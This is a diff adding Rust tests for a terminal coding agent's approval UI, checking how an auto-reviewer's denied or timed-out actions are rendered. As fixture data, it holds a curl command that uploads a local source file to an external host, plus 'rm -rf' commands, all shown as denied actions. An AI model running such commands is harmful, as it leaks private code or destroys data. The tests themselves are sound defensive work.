@@ -863,7 +863,9 @@ mod banner {
 /// 2384-2470): a mark, the words under a two-column hanging indent, the verbs bold and the
 /// snippet dim.
 mod decision_cell {
-    use codex_tui_core::screens::approvals::decided::{Actor, Decided, Grant, Outcome, Subject};
+    use codex_tui_core::screens::approvals::decided::{
+        Actor, Decided, Grant, Outcome, Reviewed, Subject, Verdict,
+    };
     use codex_tui_rtwk::sheets::approvals::DecisionCell;
     use rtwk::style::{Attrs, Color};
 
@@ -1148,6 +1150,509 @@ mod decision_cell {
         assert_eq!(
             say(Grant::Session),
             ["You granted additional permissions for this session"]
+        );
+    }
+
+    // What the auto-reviewer concluded of an action that is not a command
+    // (history_cell/approvals.rs `new_guardian_*_request`; guardian.rs snapshots
+    // guardian_write_stdin_denied_history, guardian_write_stdin_timed_out_history).
+    fn judged(verdict: Verdict, about: Reviewed) -> Decided {
+        Decided::Reviewed { verdict, about }
+    }
+
+    fn stdin(input: &str) -> Reviewed {
+        Reviewed::Stdin {
+            process: "42".into(),
+            input: input.into(),
+        }
+    }
+
+    #[test]
+    fn a_denied_or_timed_out_stdin_names_the_terminal_and_quotes_the_input() {
+        assert_eq!(
+            rows(&show(judged(Verdict::Denied, stdin("confirm\n")), 100)),
+            [r#"✗ Request denied for codex to send input to terminal 42: "confirm\n""#]
+        );
+        assert_eq!(
+            rows(&show(judged(Verdict::TimedOut, stdin("confirm\n")), 100)),
+            [r#"✗ Review timed out before codex could send input to terminal 42: "confirm\n""#]
+        );
+    }
+
+    #[test]
+    fn a_long_stdin_is_cut_at_eighty_graphemes_of_its_quoted_text() {
+        let long = "x".repeat(100);
+        let quoted = format!("\"{long}\"");
+        let cut: String = quoted.chars().take(77).collect::<String>() + "...";
+        assert_eq!(cut.chars().count(), 80);
+        assert_eq!(
+            rows(&show(judged(Verdict::Denied, stdin(&long)), 200)),
+            [format!(
+                "✗ Request denied for codex to send input to terminal 42: {cut}"
+            )]
+        );
+    }
+
+    // history_cell/approvals.rs: new_guardian_denied_patch_request,
+    // new_guardian_timed_out_patch_request
+    #[test]
+    fn a_patch_names_its_file_or_how_many_files() {
+        let one = Reviewed::Patch(vec!["src/main.rs".into()]);
+        let many = Reviewed::Patch(vec!["a.rs".into(), "b.rs".into(), "c.rs".into()]);
+        let say = |verdict, about| rows(&show(judged(verdict, about), 100));
+        assert_eq!(
+            say(Verdict::Denied, one.clone()),
+            ["✗ Request denied for codex to apply a patch touching src/main.rs"]
+        );
+        assert_eq!(
+            say(Verdict::Denied, many.clone()),
+            ["✗ Request denied for codex to apply a patch touching 3 files"]
+        );
+        assert_eq!(
+            say(Verdict::TimedOut, one),
+            ["✗ Review timed out before codex could apply a patch touching src/main.rs"]
+        );
+        assert_eq!(
+            say(Verdict::TimedOut, many),
+            ["✗ Review timed out before codex could apply a patch touching 3 files"]
+        );
+    }
+
+    // chatwidget/tool_requests.rs `on_guardian_assessment`: the MCP, network and permissions arms
+    #[test]
+    fn an_mcp_call_network_access_and_a_permission_request_each_have_their_sentence() {
+        let say = |verdict, about| rows(&show(judged(verdict, about), 100));
+        let mcp = || Reviewed::Mcp {
+            server: "docs".into(),
+            tool: "search".into(),
+        };
+        assert_eq!(
+            say(Verdict::Denied, mcp()),
+            ["✗ Request denied for codex to call MCP tool docs.search"]
+        );
+        assert_eq!(
+            say(Verdict::TimedOut, mcp()),
+            ["✗ Review timed out before codex could call MCP tool docs.search"]
+        );
+        let net = || Reviewed::Network("https://example.com".into());
+        assert_eq!(
+            say(Verdict::Denied, net()),
+            ["✗ Request denied for codex to access https://example.com"]
+        );
+        assert_eq!(
+            say(Verdict::TimedOut, net()),
+            ["✗ Review timed out before codex could access https://example.com"]
+        );
+        let permissions = |reason: Option<&str>| Reviewed::Permissions(reason.map(String::from));
+        assert_eq!(
+            say(Verdict::Denied, permissions(Some("write to /etc"))),
+            ["✗ Request denied for codex to request permissions: write to /etc"]
+        );
+        assert_eq!(
+            say(Verdict::TimedOut, permissions(Some("write to /etc"))),
+            ["✗ Review timed out before codex could request permissions: write to /etc"]
+        );
+        // a blank reason is no reason
+        assert_eq!(
+            say(Verdict::Denied, permissions(Some("  \n"))),
+            ["✗ Request denied for codex to request permissions"]
+        );
+        assert_eq!(
+            say(Verdict::Denied, permissions(None)),
+            ["✗ Request denied for codex to request permissions"]
+        );
+    }
+
+    #[test]
+    fn a_verdict_cell_has_a_red_mark_a_bold_verb_and_a_dim_subject() {
+        let t = show(judged(Verdict::Denied, stdin("hi")), 100);
+        let row = rows(&t)[0].clone();
+        let at = |needle: &str| row[..row.find(needle).expect("in the row")].chars().count();
+        assert_eq!(t.cell(0, 0).fg, Color::RED, "{:?}", t.cell(0, 0));
+        assert!(!t.cell(2, 0).attrs.intersects(Attrs::BOLD), "Request");
+        assert!(t.cell(at("denied"), 0).attrs.intersects(Attrs::BOLD));
+        let dim = t.cell(at("codex to"), 0).fg;
+        assert_ne!(dim, t.cell(2, 0).fg, "the subject is dim");
+        assert_eq!(t.cell(at("terminal"), 0).fg, dim);
+    }
+
+    #[test]
+    fn a_patch_cell_dims_the_file_or_the_count_and_not_the_words_around_it() {
+        let cells = |files: &[&str]| {
+            let about = Reviewed::Patch(files.iter().map(ToString::to_string).collect());
+            let t = show(judged(Verdict::Denied, about), 100);
+            let row = rows(&t)[0].clone();
+            let at = |needle: &str| row[..row.find(needle).expect("in the row")].chars().count();
+            (t, at("a patch"), row)
+        };
+        let (t, patch, row) = cells(&["src/main.rs"]);
+        let file = patch + "a patch touching ".len();
+        assert_ne!(t.cell(file, 0).fg, t.cell(patch, 0).fg, "{row}");
+        let (t, patch, row) = cells(&["a.rs", "b.rs"]);
+        let count = patch + "a patch touching ".len();
+        assert_ne!(t.cell(count, 0).fg, t.cell(patch, 0).fg, "{row}");
+        assert_eq!(t.cell(count + 2, 0).fg, t.cell(patch, 0).fg, "{row}");
+    }
+
+    #[test]
+    fn a_verdict_cell_waits_two_columns_in_under_its_mark() {
+        let t = show(judged(Verdict::Denied, stdin("hi")), 30);
+        let rows = rows(&t);
+        assert!(rows.len() > 1, "{rows:?}");
+        assert!(rows[0].starts_with("✗ Request denied"), "{rows:?}");
+        for row in &rows[1..] {
+            assert!(row.starts_with("  ") && !row.starts_with("   "), "{row:?}");
+        }
+    }
+}
+
+/// A thread's approvals part after the guardian notifications a fixture would send: the model
+/// is made through core's `apply`, never handed to a widget.
+#[allow(clippy::expect_used)]
+mod reviews {
+    use codex_app_server_protocol::ServerNotification;
+    use codex_tui_core::screens::approvals::ThreadPart;
+    use codex_tui_core::screens::approvals::guardian::project;
+
+    fn notification(method: &str, params: &str) -> ServerNotification {
+        serde_json::from_str(&format!(r#"{{"method":"{method}","params":{params}}}"#))
+            .expect("a notification")
+    }
+
+    pub fn command(text: &str) -> String {
+        format!(r#"{{"type":"command","source":"shell","command":{text:?},"cwd":"/tmp"}}"#)
+    }
+
+    pub const STDIN: &str = r#"{"type":"writeStdin","approvalId":"a","processId":"42","stdin":"confirm\n","cwd":"/tmp"}"#;
+
+    pub fn patch(files: &[&str]) -> String {
+        let files = files
+            .iter()
+            .map(|file| format!("{file:?}"))
+            .collect::<Vec<_>>()
+            .join(",");
+        format!(r#"{{"type":"applyPatch","cwd":"/tmp","files":[{files}]}}"#)
+    }
+
+    pub fn network(target: &str) -> String {
+        format!(
+            r#"{{"type":"networkAccess","id":"n","turnId":"t","target":{target:?},"host":"example.com","protocol":"https","port":443}}"#
+        )
+    }
+
+    pub fn mcp(server: &str, tool: &str, connector: Option<&str>) -> String {
+        let connector = connector.map_or("null".to_string(), |name| format!("{name:?}"));
+        format!(
+            r#"{{"type":"mcpToolCall","server":{server:?},"toolName":{tool:?},"connectorId":null,"connectorName":{connector},"toolTitle":null}}"#
+        )
+    }
+
+    pub fn permissions(reason: Option<&str>) -> String {
+        let reason = reason.map_or("null".to_string(), |text| format!("{text:?}"));
+        format!(r#"{{"type":"requestPermissions","reason":{reason},"permissions":{{}}}}"#)
+    }
+
+    /// One `item/autoApprovalReview/...` notification of `thread-1`.
+    pub fn review(
+        id: &str,
+        status: &str,
+        action: &str,
+        rationale: Option<&str>,
+    ) -> ServerNotification {
+        let rationale = rationale.map_or("null".to_string(), |r| format!("{r:?}"));
+        let done = if status == "inProgress" {
+            String::new()
+        } else {
+            r#","completedAtMs":1,"decisionSource":"agent""#.to_string()
+        };
+        let method = if status == "inProgress" {
+            "item/autoApprovalReview/started"
+        } else {
+            "item/autoApprovalReview/completed"
+        };
+        notification(
+            method,
+            &format!(
+                r#"{{"threadId":"thread-1","turnId":"turn-1","startedAtMs":0{done},"reviewId":"{id}","targetItemId":null,"review":{{"status":"{status}","riskLevel":null,"userAuthorization":null,"rationale":{rationale}}},"action":{action}}}"#
+            ),
+        )
+    }
+
+    /// The part after `notifications`, applied the way the app applies them.
+    pub fn part(notifications: &[ServerNotification]) -> ThreadPart {
+        let mut part = ThreadPart::default();
+        for notification in notifications {
+            let (_, ev) = project(notification).expect("a guardian notification");
+            part.apply(ev);
+        }
+        part
+    }
+}
+
+// chatwidget/tool_requests.rs `on_guardian_assessment`, status_state.rs
+// `PendingGuardianReviewStatus::status_indicator_state`; guardian.rs snapshots
+// guardian_write_stdin_review_status, guardian_parallel_reviews_render_aggregate_status
+mod review_status {
+    use super::reviews::{self, STDIN, command, part};
+    use codex_tui_rtwk::sheets::approvals::strings::EN;
+    use codex_tui_rtwk::sheets::approvals::{ReviewStatus, review_status};
+
+    fn running(actions: &[String]) -> Option<ReviewStatus> {
+        let notes: Vec<_> = actions
+            .iter()
+            .enumerate()
+            .map(|(i, action)| reviews::review(&format!("g{i}"), "inProgress", action, None))
+            .collect();
+        review_status(&EN, &part(&notes).reviews)
+    }
+
+    #[test]
+    fn no_review_under_way_says_nothing() {
+        assert_eq!(running(&[]), None);
+    }
+
+    #[test]
+    fn one_review_is_the_header_and_its_one_line_of_detail() {
+        let status = running(&[STDIN.into()]).expect("a status");
+        assert_eq!(status.header, "Reviewing approval request");
+        assert_eq!(status.details, r#"send input to terminal 42: "confirm\n""#);
+        assert_eq!(status.max_lines, 1);
+    }
+
+    #[test]
+    fn parallel_reviews_are_bullets_in_arrival_order() {
+        let status = running(&[
+            command("rm -rf '/tmp/guardian target 1'"),
+            command("rm -rf '/tmp/guardian target 2'"),
+        ])
+        .expect("a status");
+        assert_eq!(status.header, "Reviewing 2 approval requests");
+        assert_eq!(
+            status.details,
+            "• rm -rf '/tmp/guardian target 1'\n• rm -rf '/tmp/guardian target 2'"
+        );
+        assert_eq!(status.max_lines, 4);
+    }
+
+    #[test]
+    fn more_than_three_reviews_list_three_and_count_the_rest() {
+        let many: Vec<String> = (1..=5).map(|n| command(&format!("job {n}"))).collect();
+        let status = running(&many).expect("a status");
+        assert_eq!(status.header, "Reviewing 5 approval requests");
+        assert_eq!(status.details, "• job 1\n• job 2\n• job 3\n+2 more");
+    }
+
+    #[test]
+    fn each_kind_of_action_has_its_summary() {
+        let detail = |action: String| running(&[action]).expect("a status").details;
+        assert_eq!(
+            detail(reviews::patch(&["/tmp/a.rs"])),
+            "apply_patch touching /tmp/a.rs"
+        );
+        assert_eq!(
+            detail(reviews::patch(&["/tmp/a.rs", "/tmp/b.rs"])),
+            "apply_patch touching 2 files"
+        );
+        assert_eq!(
+            detail(reviews::network("https://example.com")),
+            "network access to https://example.com"
+        );
+        assert_eq!(
+            detail(reviews::mcp("docs", "search", None)),
+            "MCP search on docs"
+        );
+        // the connector's name stands in for the server's
+        assert_eq!(
+            detail(reviews::mcp("docs", "search", Some("Docs app"))),
+            "MCP search on Docs app"
+        );
+    }
+
+    #[test]
+    fn a_permission_request_names_its_reason_unless_it_is_blank() {
+        let detail = |reason: Option<&str>| {
+            running(&[reviews::permissions(reason)])
+                .expect("a status")
+                .details
+        };
+        assert_eq!(detail(None), "permission request");
+        assert_eq!(detail(Some("  ")), "permission request");
+        assert_eq!(
+            detail(Some("  write to /etc \n")),
+            "permission request: write to /etc"
+        );
+    }
+
+    #[test]
+    fn a_finished_review_leaves_the_status() {
+        let mut notes = vec![reviews::review("g0", "inProgress", &command("ls"), None)];
+        notes.push(reviews::review("g0", "approved", &command("ls"), None));
+        assert_eq!(review_status(&EN, &part(&notes).reviews), None);
+    }
+}
+
+// chatwidget/permission_popups.rs `open_auto_review_denials_popup`; guardian.rs snapshots
+// guardian_write_stdin_denials_popup, auto_review_denials_popup
+mod auto_review {
+    use super::reviews::{self, STDIN, command, part};
+    use crate::common::{Harness, ms, start_sized};
+    use crate::dialogs::oracle::assert_rows;
+    use codex_tui_core::app::{AppEv, Intent};
+    use codex_tui_core::screens::ScreenIntent;
+    use codex_tui_core::screens::select::list::List;
+    use codex_tui_core::screens::select::{Intent as SelectIntent, Menu};
+    use codex_tui_rtwk::sheets::approvals::auto_review_menu;
+    use codex_tui_rtwk::sheets::approvals::strings::EN;
+
+    fn denied(
+        id: &str,
+        action: &str,
+        rationale: Option<&str>,
+    ) -> codex_app_server_protocol::ServerNotification {
+        reviews::review(id, "denied", action, rationale)
+    }
+
+    fn menu(notes: &[codex_app_server_protocol::ServerNotification]) -> List {
+        auto_review_menu(&EN, &part(notes).recent_denials)
+    }
+
+    #[test]
+    fn the_list_is_a_header_row_then_a_row_per_denial_newest_first() {
+        let list = menu(&[
+            denied("g1", &command("rm one"), Some("Destructive.")),
+            denied("g2", &command("rm two"), None),
+        ]);
+        assert_eq!(list.title.as_deref(), Some("Auto-review Denials"));
+        assert_eq!(
+            list.subtitle.as_deref(),
+            Some("Select a denied action to approve.")
+        );
+        assert!(list.searchable);
+        assert!(!list.numbered, "the rows carry no numbers");
+        let rows: Vec<_> = list
+            .items
+            .iter()
+            .map(|item| {
+                (
+                    item.name.as_str(),
+                    item.description.as_deref(),
+                    item.id.as_str(),
+                )
+            })
+            .collect();
+        assert_eq!(
+            rows,
+            [
+                ("Action", Some("Rationale"), ""),
+                (
+                    "rm two",
+                    Some("Auto-review did not include a rationale"),
+                    "g2"
+                ),
+                ("rm one", Some("Destructive."), "g1"),
+            ]
+        );
+    }
+
+    #[test]
+    fn the_header_row_cannot_be_picked_and_every_search_keeps_it() {
+        let list = menu(&[denied("g1", &command("rm one"), Some("Destructive."))]);
+        assert!(list.items[0].is_disabled());
+        assert_eq!(list.items[0].search_value.as_deref(), Some(""));
+    }
+
+    #[test]
+    fn a_row_is_found_by_its_action_or_its_rationale_and_shows_the_rationale_when_highlighted() {
+        let list = menu(&[denied("g1", &command("rm one"), Some("Destructive."))]);
+        let row = &list.items[1];
+        assert_eq!(row.search_value.as_deref(), Some("rm one Destructive."));
+        assert_eq!(row.selected_description.as_deref(), Some("Destructive."));
+        assert!(!row.is_disabled());
+    }
+
+    #[test]
+    fn a_review_that_was_approved_or_is_still_running_is_not_a_denial() {
+        let list = menu(&[
+            reviews::review("g1", "inProgress", &command("ls"), None),
+            reviews::review("g2", "approved", &command("pwd"), None),
+            reviews::review("g3", "timedOut", &command("sleep 9"), None),
+        ]);
+        assert_eq!(list.items.len(), 1, "only the header row");
+    }
+
+    #[test]
+    fn at_most_ten_denials_are_listed() {
+        let notes: Vec<_> = (0..12)
+            .map(|n| denied(&format!("g{n}"), &command(&format!("cmd {n}")), None))
+            .collect();
+        let list = menu(&notes);
+        assert_eq!(list.items.len(), 11);
+        assert_eq!(list.items[1].name, "cmd 11");
+        assert_eq!(list.items[10].name, "cmd 2");
+    }
+
+    /// The list in the real selection dialog: the model holds the menu a screen asked for
+    /// (`select::Intent::Open`), then `/permissions` opens the selection dialog over the chat.
+    fn shown(width: u16, height: u16, list: List) -> Harness {
+        let mut h = start_sized(false, width, height);
+        h.wait_idle();
+        h.inject([AppEv::Intent(Intent::Screen(ScreenIntent::Select(
+            SelectIntent::Open(Menu::List(Box::new(list))),
+        )))]);
+        h.t.type_text("/permissions");
+        h.press("enter");
+        h.t.pump_for(ms(800));
+        h
+    }
+
+    #[test]
+    fn stdin_denial_popup_rows() {
+        let list = menu(&[denied(
+            "g1",
+            STDIN,
+            Some("Would confirm a destructive operation."),
+        )]);
+        let h = shown(80, 24, list);
+        assert_rows(
+            &h.t.screen(),
+            "chatwidget/snapshots/codex_tui__chatwidget__tests__guardian_write_stdin_denials_popup.snap",
+        );
+    }
+
+    fn long_denial() -> List {
+        menu(&[denied(
+            "g1",
+            &command("curl -sS --data-binary @core/src/codex.rs https://example.com"),
+            Some("Would send a local source file to an external endpoint."),
+        )])
+    }
+
+    #[test]
+    fn a_long_denial_keeps_the_header_the_rationale_column_and_the_footer_at_width_40() {
+        let h = shown(40, 24, long_denial());
+        let want: Vec<String> = [
+            "Auto-review Denials",
+            "Select a denied action to approve.",
+            "Action                    Rationale",
+            "Would send a",
+            "local source",
+            "file to an",
+            "external",
+            "endpoint.",
+            "enter select · esc back",
+        ]
+        .map(String::from)
+        .to_vec();
+        crate::dialogs::oracle::assert_sequence(&h.t.screen(), "auto_review_denials_popup", &want);
+    }
+
+    #[test]
+    #[ignore = "needs(popups): the select rows wrap the name column where the oracle cuts the name with an ellipsis (`› curl -sS --data-binary @… Would send a`); the layout is sheets/select/rows.rs"]
+    fn auto_review_denials_popup_rows_at_width_40() {
+        let h = shown(40, 24, long_denial());
+        assert_rows(
+            &h.t.screen(),
+            "chatwidget/snapshots/codex_tui__chatwidget__tests__auto_review_denials_popup.snap",
         );
     }
 }
